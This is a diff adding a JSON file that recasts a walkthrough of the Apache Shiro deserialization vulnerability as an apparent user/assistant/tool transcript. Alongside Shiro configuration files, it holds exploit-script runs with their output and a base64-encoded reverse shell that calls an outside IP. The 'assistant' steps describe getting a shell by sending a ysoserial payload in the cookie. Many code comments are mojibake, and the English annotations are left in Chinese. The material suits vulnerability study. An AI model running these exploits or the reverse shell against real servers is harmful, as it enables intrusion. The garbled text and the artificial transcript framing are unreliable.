@@ -1,0 +1,152 @@
+{
+    "_source_md":  "Deser-Walkthrough/2020-05-18-ShiroDeser.md",
+    "version":  "shiro-deserialization",
+    "title":  {
+                  "zh":  "Shiro反序列化漏洞分析",
+                  "en":  "Shiro Deserialization Vulnerability Analysis"
+              },
+    "description":  {
+                        "zh":  "Shiro框架反序列化漏洞原理分析与利用，包括框架简介、代码层分析和getshell过程。",
+                        "en":  "Shiro framework deserialization vulnerability analysis and exploitation, including framework intro, code-level analysis and getshell process."
+                    },
+    "steps":  [
+                  {
+                      "type":  "user_message",
+                      "content":  {
+                                      "zh":  "分析Shiro反序列化漏洞",
+                                      "en":  "Analyze Shiro deserialization vulnerability"
+                                  },
+                      "annotation":  {
+                                         "zh":  "用户执行操作",
+                                         "en":  "用户执行操作"
+                                     },
+                      "codeBlocks":  [
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "\u003cwelcome-file-list\u003e\n    \u003cwelcome-file\u003eindex.jsp\u003c/welcome-file\u003e\n\u003c/welcome-file-list\u003e",
+                                             "language":  "xml"
+                                         },
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "\u003cjsp:forward page=\"home.jsp\"/\u003e\n//璺冲埌home.jsp home椤甸潰鍖呭惈include.jsp\n\u003c%@ include file=\"include.jsp\" %\u003e\n//include.jsp瀵煎叆SecurityUtils绫?\u003c%@ page import=\"org.apache.shiro.SecurityUtils\" %\u003e",
+                                             "language":  "java"
+                                         },
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "    _jspService(HttpServletRequest, HttpServletResponse):21, index_jsp\n    //姝ｅ父jsp server璇锋眰\n    service(HttpServletRequest, HttpServletResponse):71, HttpJspBase\n    //server鍝嶅簲request锛岃繑鍥濲SESSIONID\n    service(ServletRequest, ServletResponse):733, HttpServlet\n    //浠ヨ繑鍥炵殑JSESSIONID COOKIE璁块棶http://127.0.0.1:8080/shiro/account",
+                                             "language":  "java"
+                                         },
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "this = {index_jsp@4030} \nrequest = {ShiroHttpServletRequest@5282} \nresponse = {ResponseFacade@4532} \n_jspx_method = \"GET\"\nout = {JspWriterImpl@5284}\n_jspx_out = {JspWriterImpl@5284} \n_jspx_page_context = {PageContextImpl@5285} \npageContext = {PageContextImpl@5285}",
+                                             "language":  "bash"
+                                         },
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "python3 shiro_rce.py https://shiro.vuln.ip/login.html \"ping x.dnslog.cn\"\n ____  _     _          ____                  \n/ ___|| |__ (_)_ __ ___/ ___|  ___ __ _ _ __  \n\\___ \\| \u0027_ \\| | \u0027__/ _ \\___ \\ / __/ _` | \u0027_ \\ \n ___) | | | | | | | (_) |__) | (_| (_| | | | |\n|____/|_| |_|_|_|  \\___/____/ \\___\\__,_|_| |_|\n\n                           By 鏂枃\n\nWelcome To Shiro鍙嶅簭鍒楀寲 RCE ! \n[*]  寮€濮嬫娴嬫ā鍧?Class1:CommonsBeanutils1",
+                                             "language":  "bash"
+                                         },
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "x.dnslog.cn    shiro.vuln.ip 2020-07-02 16:46:35\nx.dnslog.cn    shiro.vuln.ip 2020-07-02 16:45:52\nx.dnslog.cn    shiro.vuln.ip 2020-07-02 16:45:52\nx.dnslog.cn    shiro.vuln.ip 2020-07-02 16:45:52",
+                                             "language":  "bash"
+                                         },
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "python shiro_exp.py https://shiro.vuln.ip/login.html\ntry CipherKey :4AvVhmFLUs0KTA3Kprsdag==\ngenerator payload done.\nsend payload ok.\nchecking.....\nchecking.....\nchecking.....\nchecking.....\nvulnerable:true url:https://shiro.vuln.ip/login.html    CipherKey:3AvVhmFLUs0KTA3Kprsdag==",
+                                             "language":  "bash"
+                                         },
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny41Mi4yMzMuOTIvMTIzNCAwPiYx}|{base64,-d}|{bash,-i}",
+                                             "language":  "bash"
+                                         },
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "  \u003c!-- Apache Shiro --\u003e\n  \u003cfilter\u003e\n    \u003cfilter-name\u003eshiroFilter\u003c/filter-name\u003e\n    \u003cfilter-class\u003eorg.springframework.web.filter.DelegatingFilterProxy\u003c/filter-class\u003e\n    \u003cinit-param\u003e\n      \u003cparam-name\u003etargetFilterLifecycle\u003c/param-name\u003e\n      \u003cparam-value\u003etrue\u003c/param-value\u003e\n    \u003c/init-param\u003e\n  \u003c/filter\u003e\n  \u003cfilter-mapping\u003e\n    \u003cfilter-name\u003eshiroFilter\u003c/filter-name\u003e\n    \u003curl-pattern\u003e/*\u003c/url-pattern\u003e\n  \u003c/filter-mapping\u003e\n\n  \u003c!-- PageCache, cache .html suffix.\n  \u003cfilter\u003e\n    \u003cfilter-name\u003ePageCacheFilter\u003c/filter-name\u003e\n    \u003cfilter-class\u003ecom.thinkgem.jeesite.common.filter.PageCachingFilter\u003c/filter-class\u003e\n  \u003c/filter\u003e\n  \u003cfilter-mapping\u003e\n    \u003cfilter-name\u003ePageCacheFilter\u003c/filter-name\u003e\n    \u003curl-pattern\u003e/\u003c/url-pattern\u003e\n  \u003c/filter-mapping\u003e\n  \u003cfilter-mapping\u003e\n    \u003cfilter-name\u003ePageCacheFilter\u003c/filter-name\u003e\n    \u003curl-pattern\u003e*.html\u003c/url-pattern\u003e\n  \u003c/filter-mapping\u003e--\u003e\n\n  \u003c!-- SiteMesh --\u003e\n  \u003cfilter\u003e\n    \u003cfilter-name\u003esitemeshFilter\u003c/filter-name\u003e\n    \u003cfilter-class\u003ecom.opensymphony.sitemesh.webapp.SiteMeshFilter\u003c/filter-class\u003e\n  \u003c/filter\u003e\n  \u003cfilter-mapping\u003e\n    \u003cfilter-name\u003esitemeshFilter\u003c/filter-name\u003e\n    \u003curl-pattern\u003e/a/*\u003c/url-pattern\u003e\n  \u003c/filter-mapping\u003e\n  \u003cfilter-mapping\u003e\n    \u003cfilter-name\u003esitemeshFilter\u003c/filter-name\u003e\n    \u003curl-pattern\u003e/f/*\u003c/url-pattern\u003e\n  \u003c/filter-mapping\u003e",
+                                             "language":  "xml"
+                                         },
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "\u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e\n\u003cbeans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n  xmlns:context=\"http://www.springframework.org/schema/context\" xsi:schemaLocation=\"\n    http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-4.0.xsd\n    http://www.springframework.org/schema/context  http://www.springframework.org/schema/context/spring-context-4.0.xsd\"\n  default-lazy-init=\"true\"\u003e\n\n  \u003cdescription\u003eShiro Configuration\u003c/description\u003e\n\n    \u003c!-- 鍔犺浇閰嶇疆灞炴€ф枃浠?--\u003e\n  \u003ccontext:property-placeholder ignore-unresolvable=\"true\" location=\"classpath:jeesite.properties\" /\u003e\n  \n  \u003c!-- Shiro鏉冮檺杩囨护杩囨护鍣ㄥ畾涔?--\u003e\n  \u003cbean name=\"shiroFilterChainDefinitions\" class=\"java.lang.String\"\u003e\n    \u003cconstructor-arg\u003e\n      \u003cvalue\u003e\n        /static/** = anon\n        /userfiles/** = anon\n        ${adminPath}/cas = cas\n        ${adminPath}/login = authc\n        ${adminPath}/isValidateKlp = anon\n        ${adminPath}/queryLoingname = anon\n        ${adminPath}/ukeyIsExist = anon\n        ${adminPath}/validSlider/** = anon\n        ${adminPath}/dataInterface/** = anon\n        ${adminPath}/sys/forget/** = anon\u003c!-- 鐧诲綍椤靛繕璁板瘑鐮?--\u003e\n        ${adminPath}/logout = logout\n        ${adminPath}/** = user\n        /act/rest/service/editor/** = perms[act:model:edit]\n        /act/rest/service/model/** = perms[act:model:edit]\n        /act/rest/service/** = user\n        /ReportServer/** = user\n        \n        ${mobilePath}/** = anon\n      \u003c/value\u003e\n    \u003c/constructor-arg\u003e\n  \u003c/bean\u003e\n  \n  \u003c!-- 瀹夊叏璁よ瘉杩囨护鍣?--\u003e\n  \u003cbean id=\"shiroFilter\" class=\"org.apache.shiro.spring.web.ShiroFilterFactoryBean\"\u003e\n    \u003cproperty name=\"securityManager\" ref=\"securityManager\" /\u003e\u003c!-- \n    \u003cproperty name=\"loginUrl\" value=\"${cas.server.url}?service=${cas.project.url}${adminPath}/cas\" /\u003e --\u003e\n    \u003cproperty name=\"loginUrl\" value=\"${adminPath}/login\" /\u003e\n    \u003cproperty name=\"successUrl\" value=\"${adminPath}?login\" /\u003e\n    \u003cproperty name=\"filters\"\u003e\n            \u003cmap\u003e\n                \u003centry key=\"cas\" value-ref=\"casFilter\"/\u003e\n                \u003centry key=\"authc\" value-ref=\"formAuthenticationFilter\"/\u003e\n            \u003c/map\u003e\n        \u003c/property\u003e\n    \u003cproperty name=\"filterChainDefinitions\"\u003e\n      \u003cref bean=\"shiroFilterChainDefinitions\"/\u003e\n    \u003c/property\u003e\n  \u003c/bean\u003e\n  \n  \u003c!-- CAS璁よ瘉杩囨护鍣?--\u003e  \n  \u003cbean id=\"casFilter\" class=\"org.apache.shiro.cas.CasFilter\"\u003e  \n    \u003cproperty name=\"failureUrl\" value=\"${adminPath}/login\"/\u003e\n  \u003c/bean\u003e\n  \n  \u003c!-- 瀹氫箟Shiro瀹夊叏绠＄悊閰嶇疆 --\u003e\n  \u003cbean id=\"securityManager\" class=\"org.apache.shiro.web.mgt.DefaultWebSecurityManager\"\u003e\n    \u003cproperty name=\"realm\" ref=\"systemAuthorizingRealm\" /\u003e\n    \u003cproperty name=\"sessionManager\" ref=\"sessionManager\" /\u003e\n    \u003cproperty name=\"cacheManager\" ref=\"shiroCacheManager\" /\u003e\n  \u003c/bean\u003e\n  \n  \u003c!-- 鑷畾涔変細璇濈鐞嗛厤缃?--\u003e\n  \u003cbean id=\"sessionManager\" class=\"com.thinkgem.jeesite.common.security.shiro.session.SessionManager\"\u003e \n    \u003cproperty name=\"sessionDAO\" ref=\"sessionDAO\"/\u003e\n    \n    \u003c!-- 浼氳瘽瓒呮椂鏃堕棿锛屽崟浣嶏細姣  --\u003e\n    \u003cproperty name=\"globalSessionTimeout\" value=\"${session.sessionTimeout}\"/\u003e\n    \n    \u003c!-- 瀹氭椂娓呯悊澶辨晥浼氳瘽, 娓呯悊鐢ㄦ埛鐩存帴鍏抽棴娴忚鍣ㄩ€犳垚鐨勫绔嬩細璇?  --\u003e\n    \u003cproperty name=\"sessionValidationInterval\" value=\"${session.sessionTimeoutClean}\"/\u003e\n\u003c!--      \u003cproperty name=\"sessionValidationSchedulerEnabled\" value=\"false\"/\u003e --\u003e\n    \u003cproperty name=\"sessionValidationSchedulerEnabled\" value=\"true\"/\u003e\n    \n    \u003cproperty name=\"sessionIdCookie\" ref=\"sessionIdCookie\"/\u003e\n    \u003cproperty name=\"sessionIdCookieEnabled\" value=\"true\"/\u003e\n  \u003c/bean\u003e\n  \n  \u003c!-- 鎸囧畾鏈郴缁烻ESSIONID, 榛樿涓? JSESSIONID 闂: 涓嶴ERVLET瀹瑰櫒鍚嶅啿绐? 濡侸ETTY, TOMCAT 绛夐粯璁SESSIONID,\n    褰撹烦鍑篠HIRO SERVLET鏃跺ERROR-PAGE瀹瑰櫒浼氫负JSESSIONID閲嶆柊鍒嗛厤鍊煎鑷寸櫥褰曚細璇濅涪澶? --\u003e\n  \u003cbean id=\"sessionIdCookie\" class=\"org.apache.shiro.web.servlet.SimpleCookie\"\u003e\n      \u003cconstructor-arg name=\"name\" value=\"jeesite.session.id\"/\u003e\n      \u003cproperty name=\"path\" value=\"/\" /\u003e\n  \u003c/bean\u003e\n\n  \u003c!-- 鑷畾涔塖ession瀛樺偍瀹瑰櫒 --\u003e\n  \u003cbean id=\"sessionDAO\" class=\"com.thinkgem.jeesite.common.security.shiro.session.JedisSessionDAO\"\u003e\n    \u003cproperty name=\"sessionIdGenerator\" ref=\"idGen\" /\u003e\n    \u003cproperty name=\"sessionKeyPrefix\" value=\"${redis.keyPrefix}:user:session_\" /\u003e\n  \u003c/bean\u003e \n  \u003c!--\u003cbean id=\"sessionDAO\" class=\"com.thinkgem.jeesite.common.security.shiro.session.CacheSessionDAO\"\u003e\n    \u003cproperty name=\"sessionIdGenerator\" ref=\"idGen\" /\u003e\n    \u003cproperty name=\"activeSessionsCacheName\" value=\"activeSessionsCache\" /\u003e\n    \u003cproperty name=\"cacheManager\" ref=\"shiroCacheManager\" /\u003e\n  \u003c/bean\u003e--\u003e\n  \n  \u003c!-- 瀹氫箟鎺堟潈缂撳瓨绠＄悊鍣?--\u003e\n\u003c!--  \u003cbean id=\"shiroCacheManager\" class=\"com.thinkgem.jeesite.common.security.shiro.cache.SessionCacheManager\" /\u003e --\u003e\n  \u003cbean id=\"shiroCacheManager\" class=\"org.apache.shiro.cache.ehcache.EhCacheManager\"\u003e\n    \u003cproperty name=\"cacheManager\" ref=\"cacheManager\"/\u003e\n  \u003c/bean\u003e\n  \n  \u003c!-- 淇濊瘉瀹炵幇浜哠hiro鍐呴儴lifecycle鍑芥暟鐨刡ean鎵ц --\u003e\n  \u003cbean id=\"lifecycleBeanPostProcessor\" class=\"org.apache.shiro.spring.LifecycleBeanPostProcessor\"/\u003e\n  \n  \u003c!-- AOP寮忔柟娉曠骇鏉冮檺妫€鏌? --\u003e\n  \u003cbean class=\"org.springframework.aop.framework.autoproxy.DefaultAdvisorAutoProxyCreator\" depends-on=\"lifecycleBeanPostProcessor\"\u003e\n    \u003cproperty name=\"proxyTargetClass\" value=\"true\" /\u003e\n  \u003c/bean\u003e\n  \u003cbean class=\"org.apache.shiro.spring.security.interceptor.AuthorizationAttributeSourceAdvisor\"\u003e\n      \u003cproperty name=\"securityManager\" ref=\"securityManager\"/\u003e\n  \u003c/bean\u003e\n  \n\u003c/beans\u003e",
+                                             "language":  "xml"
+                                         }
+                                     ]
+                  },
+                  {
+                      "type":  "assistant_text",
+                      "content":  {
+                                      "zh":  "Shiro核心组件：Subject(当前用户)、SecurityManager(安全管理)、Realm(数据连接)",
+                                      "en":  "Shiro core components: Subject(current user), SecurityManager(security management), Realm(data connection)"
+                                  },
+                      "annotation":  {
+                                         "zh":  "助手响应",
+                                         "en":  "助手响应"
+                                     }
+                  },
+                  {
+                      "type":  "assistant_text",
+                      "content":  {
+                                      "zh":  "漏洞特征：Set-Cookie返回rememberMe=deleteMe、JSESSIONID Cookie、特定CMS集成Shiro",
+                                      "en":  "Vulnerability features: Set-Cookie returns rememberMe=deleteMe, JSESSIONID Cookie, specific CMS integrates Shiro"
+                                  },
+                      "annotation":  {
+                                         "zh":  "助手响应",
+                                         "en":  "助手响应"
+                                     }
+                  },
+                  {
+                      "type":  "tool_result",
+                      "toolName":  "exec",
+                      "content":  {
+                                      "zh":  "使用Shiroscan工具验证漏洞存在，通过Dnslog确认命令执行",
+                                      "en":  "Use Shiroscan tool to verify vulnerability, confirm command execution via Dnslog"
+                                  },
+                      "annotation":  {
+                                         "zh":  "工具执行结果",
+                                         "en":  "工具执行结果"
+                                     }
+                  },
+                  {
+                      "type":  "assistant_text",
+                      "content":  {
+                                      "zh":  "Getshell：生成base64编码的反弹shell命令，使用ysoserial生成JRMPClient payload，替换Cookie发包",
+                                      "en":  "Getshell: Generate base64 encoded reverse shell command, use ysoserial to generate JRMPClient payload, replace Cookie and send packet"
+                                  },
+                      "annotation":  {
+                                         "zh":  "助手响应",
+                                         "en":  "助手响应"
+                                     }
+                  }
+              ]
+}
